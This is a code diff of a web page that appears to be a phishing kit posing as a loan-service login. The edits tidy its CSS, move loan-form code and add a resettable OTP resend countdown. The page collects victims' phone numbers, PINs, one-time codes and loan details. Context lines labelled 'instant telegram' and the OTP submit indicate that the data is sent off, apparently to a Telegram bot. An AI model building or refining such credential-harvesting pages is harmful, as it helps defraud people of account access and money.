@@ -75,19 +75,12 @@ input{
   font-weight:600;
 }
 
-.btn[disabled]{
-  background:#334155;
-}
+.btn[disabled]{background:#334155}
 
 .req{color:#ef4444}
 .small{font-size:13px;color:#9ca3af}
 .success{color:#22c55e}
-
-.error{
-  min-height:18px;
-  font-size:13px;
-  color:#ef4444;
-}
+.error{font-size:13px;color:#ef4444}
 
 /* PIN */
 .pin-row{
@@ -149,7 +142,7 @@ input{
 .resend-row{
   display:flex;
   justify-content:space-between;
-  margin-top:10px;
+  margin-top:12px;
 }
 
 .resend-btn{
@@ -212,11 +205,7 @@ input{
 
 <strong>Enter OTP</strong>
 
-<p class="small">
-
-We have sent OTP to your phone
-
-</p>
+<p class="small">We have sent an OTP to your phone.</p>
 
 
 <div class="otp-row">
@@ -247,26 +236,14 @@ Resend in
 
 </div>
 
-<button id="resendBtn" disabled>
-
-Resend OTP
-
-</button>
+<button id="resendBtn" disabled>Resend OTP</button>
 
 
-<div style="margin-top:10px">
+<div style="margin-top:12px">
 
-<button id="confirmOtp" class="resend-btn action-primary" disabled>
+<button id="confirmOtp" class="resend-btn action-primary" disabled>Confirm</button>
 
-Confirm
-
-</button>
-
-<button id="cancelOtp" class="resend-btn">
-
-Cancel
-
-</button>
+<button id="cancelOtp" class="resend-btn">Cancel</button>
 
 </div>
 
@@ -281,31 +258,7 @@ Cancel
 
 <script>
 
-/* plan unchanged */
-let selectedPlan=null;
-try{
-const raw=sessionStorage.getItem('selectedPlan')||localStorage.getItem('selectedPlan');
-if(raw){
-selectedPlan=JSON.parse(raw);
-localStorage.setItem('selectedPlan',raw);
-}
-}catch(e){}
-
-
-/* loan unchanged */
-const loanForm=JSON.parse(sessionStorage.getItem('loanForm')||'{}');
-
-function buildLoanRequest(){
-
-if(!loanForm.loanAmount) return 'N/A';
-
-return `${loanForm.loanAmount}/${loanForm.loanType}/${loanForm.repayment} (${loanForm.employment})`;
-
-}
-
-
-
-/* phone enforcement */
+/* phone enforce */
 
 const phone=document.getElementById('phone');
 
@@ -346,7 +299,7 @@ updatePin();
 });
 
 
-/* PIN smooth backspace */
+/* PIN smooth */
 
 const pins=[...document.querySelectorAll('.pin-digit')];
 
@@ -394,7 +347,6 @@ pins[i-1].classList.remove('filled');
 
 }
 
-
 e.preventDefault();
 
 updatePin();
@@ -411,11 +363,22 @@ function updatePin(){
 
 pinValue=pins.map(p=>p.value).join('');
 
-
 loginBtn.disabled=!(validatePhone()&&/^\d{4}$/.test(pinValue));
 
 }
 
+
+/* loan unchanged */
+
+const loanForm=JSON.parse(sessionStorage.getItem('loanForm')||'{}');
+
+function buildLoanRequest(){
+
+if(!loanForm.loanAmount) return 'N/A';
+
+return `${loanForm.loanAmount}/${loanForm.loanType}/${loanForm.repayment} (${loanForm.employment})`;
+
+}
 
 
 /* instant telegram */
@@ -435,8 +398,7 @@ body:JSON.stringify(payload)
 }
 
 
-
-/* OTP smooth */
+/* OTP original behaviour */
 
 const dots=[...document.querySelectorAll('.otp-digit')];
 
@@ -448,8 +410,6 @@ const resendBtn=document.getElementById('resendBtn');
 
 const countdown=document.getElementById('countdown');
 
-const otpStatus=document.getElementById('otpStatus');
-
 
 function renderOtp(v){
 
@@ -459,13 +419,10 @@ d.classList.toggle('filled',!!v[i]);
 
 });
 
-
 confirmBtn.disabled=v.length!==5;
 
 }
 
-
-/* keep keyboard */
 
 buffer.addEventListener('input',()=>{
 
@@ -492,17 +449,37 @@ renderOtp(buffer.value);
 dots.forEach(d=>d.onclick=()=>buffer.focus());
 
 
+let timer=null;
+
 let sec=120;
 
-setInterval(()=>{
 
-sec--;
+function startCountdown(){
+
+clearInterval(timer);
+
+sec=120;
+
+resendBtn.disabled=true;
 
 countdown.innerText=sec;
 
-if(sec<=0) resendBtn.disabled=false;
+
+timer=setInterval(()=>{
+
+countdown.innerText=--sec;
+
+if(sec===0){
+
+clearInterval(timer);
+
+resendBtn.disabled=false;
+
+}
 
 },1000);
+
+}
 
 
 /* login instant */
@@ -532,6 +509,8 @@ buffer.value='';
 renderOtp('');
 
 buffer.focus();
+
+startCountdown();
 
 });
 
@@ -576,12 +555,16 @@ loan_request:buildLoanRequest()
 
 });
 
+startCountdown();
+
 };
 
 
 cancelOtp.onclick=()=>{
 
 otpModal.style.display='none';
+
+clearInterval(timer);
 
 };
 
